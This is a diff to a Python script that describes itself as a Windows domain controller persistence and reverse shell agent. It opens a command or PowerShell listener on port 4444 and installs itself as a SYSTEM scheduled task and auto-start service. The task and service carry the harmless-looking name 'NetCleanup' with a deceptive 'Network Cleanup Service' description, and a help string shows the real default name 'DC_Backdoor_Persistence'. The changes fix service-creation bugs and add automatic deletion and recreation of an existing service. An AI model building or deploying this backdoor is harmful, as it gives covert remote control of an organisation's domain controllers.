@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Windows Reverse Shell Agent
+Windows Domain Controller Persistence & Reverse Shell Agent (Smart Service Mode)
+ALL PATHS DYNAMIC - NO HARDCODED PATHS (except Windows executables)
 
 FEATURES:
  1. Reverse TCP listener (Port 4444 default)
@@ -12,6 +13,7 @@ FEATURES:
  6. Dynamic Path Resolution: Uses environment variables for all paths
  7. Smart Reconfig: Updates existing Task/Service without full reinstall
  8. Single Payload Enforcement: Prevents multiple active instances
+ 9. Fixed binPath: Proper argument spacing
 """
 
 import socket
@@ -171,15 +173,15 @@ LISTENER_HOST = "0.0.0.0"
 DEFAULT_PORT = 4444
 DEFAULT_TASK_NAME = "NetCleanup"
 DEFAULT_TASK_RUN_AS = "SYSTEM"
-DEFAULT_TASK_TRIGGER = "ONSTART" # Default to ONSTART, but allow override to MINUTE/5Min
+DEFAULT_TASK_TRIGGER = "ONSTART"
 SERVICE_NAME = "NetCleanup"
-SERVICE_DISPLAY_NAME = "Network Manager Cleanup"
+SERVICE_DISPLAY_NAME = "Network Cleanup Service"
 SERVICE_DESCRIPTION = "Windows Service with Self-Repair for Network Connection Cleanup"
 
 # === PROMPT CONFIGURATION ===
 PROMPT_TEMPLATE = "{user}@{hostname} - {folder}>"
 
-# === WINDOWS SERVICE CLASS (Dynamic Paths + Reconfig) ===
+# === WINDOWS SERVICE CLASS (Dynamic Paths + Smart Reconfig) ===
 class WindowsService:
     """Windows Service wrapper for DC Payload with dynamic path resolution."""
     
@@ -203,8 +205,10 @@ class WindowsService:
             script_name = os.path.basename(self.path)
             full_path = os.path.join(script_dir, script_name)
             
-            # === CRITICAL FIX ===
-            binPath = f'"{full_path} {self.args}"'
+            # === CRITICAL FIX: Proper spacing in binPath ===
+            # Remove leading/trailing whitespace from arguments
+            clean_args = ' '.join(self.args.split())
+            binPath = f'"{full_path} {clean_args}"'
             
             command = (
                 f'sc create {self.service_name} '
@@ -222,7 +226,7 @@ class WindowsService:
                 print(f"[+] Display Name: {self.display_name}")
                 print(f"[+] Start Type: AUTO")
                 print(f"[+] Script Path: {full_path}")
-                print(f"[+] Arguments: {self.args}")
+                print(f"[+] Arguments: {clean_args}")
                 print(f"[+] Full binPath: {binPath}")
                 print("[*] Run 'sc start NetCleanup' to start")
                 print("[*] Run 'sc stop NetCleanup' to stop")
@@ -232,6 +236,34 @@ class WindowsService:
                 print(f"[!] Error creating service: {result.stderr}")
                 print(f"[!] Return Code: {result.returncode}")
                 print(f"[!] Full Command: {command}")
+                
+                # Error 1639 = Service name already taken
+                if result.returncode == 1639:
+                    print("[!] Service name 'NetCleanup' already taken.")
+                    print("[+] Checking existing service...")
+                    
+                    # Check what's running
+                    try:
+                        check = subprocess.run(f'sc query {self.service_name}', shell=True, capture_output=True, text=True)
+                        print(f"[+] Existing service info:\n{check.stdout}")
+                        
+                        # Ask to replace or delete
+                        print("[!] Do you want to delete the existing service first? (y/n)")
+                        # For now, auto-delete for smooth operation
+                        print("[*] Auto-deleting existing service...")
+                        delete_result = subprocess.run(f'sc delete {self.service_name}', shell=True, capture_output=True, text=True)
+                        print(f"[+] Delete result: {delete_result.stdout}")
+                        
+                        # Try to create again
+                        print("[*] Re-creating service...")
+                        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+                        if result.returncode == 0:
+                            print(f"[+] Service recreated successfully.")
+                        else:
+                            print(f"[!] Second attempt failed: {result.stderr}")
+                    except Exception as e:
+                        print(f"[!] Error checking service: {e}")
+                
                 return False
                 
         except Exception as e:
@@ -251,7 +283,9 @@ class WindowsService:
             script_name = os.path.basename(self.path)
             full_path = os.path.join(script_dir, script_name)
             
-            binPath = f'"{full_path} {self.args}"'
+            # === CRITICAL FIX: Proper spacing in binPath ===
+            clean_args = ' '.join(self.args.split())
+            binPath = f'"{full_path} {clean_args}"'
             command = f'sc config {self.service_name} binPath={binPath}'
             print(f"[*] Running Command: {command}")
             result = subprocess.run(command, shell=True, capture_output=True, text=True)
@@ -259,7 +293,7 @@ class WindowsService:
             if result.returncode == 0:
                 print(f"[+] Service Configured: {self.service_name}")
                 print(f"[+] Script Path: {full_path}")
-                print(f"[+] Arguments: {self.args}")
+                print(f"[+] Arguments: {clean_args}")
                 print("[*] Service is still running, no restart needed.")
                 return True
             else:
@@ -456,14 +490,14 @@ def get_script_path():
     return PathAbstraction.get_script_path()
 
 def main():
-    parser = argparse.ArgumentParser(description="Windows Reverse Shell Agent")
+    parser = argparse.ArgumentParser(description="Windows Reverse Shell Persistence Agent")
     parser.add_argument('--mode', type=str, default='cmd', choices=['cmd', 'powershell'], help='Shell mode (Default: cmd)')
     parser.add_argument('--port', type=int, default=DEFAULT_PORT, help='Listening port (Default: 4444)')
     parser.add_argument('--install', action='store_true', help='Install as Windows Service')
     parser.add_argument('--service', action='store_true', help='Run as Windows Service')
     parser.add_argument('--install-persistence', action='store_true', help='Install Task Scheduler persistence')
     parser.add_argument('--path', type=str, default=".", help='Script path')
-    parser.add_argument('--task-name', type=str, default=DEFAULT_TASK_NAME, help='Task Name (Default: NetCleanup)')
+    parser.add_argument('--task-name', type=str, default=DEFAULT_TASK_NAME, help='Task Name (Default: DC_Backdoor_Persistence)')
     parser.add_argument('--task-freq', type=str, default=DEFAULT_TASK_TRIGGER, help='Task Frequency (Default: ONSTART, e.g. MINUTE, 5MIN)')
     parser.add_argument('--reconfig', action='store_true', help='Reconfig existing Service/Task without restart')
     args = parser.parse_args()
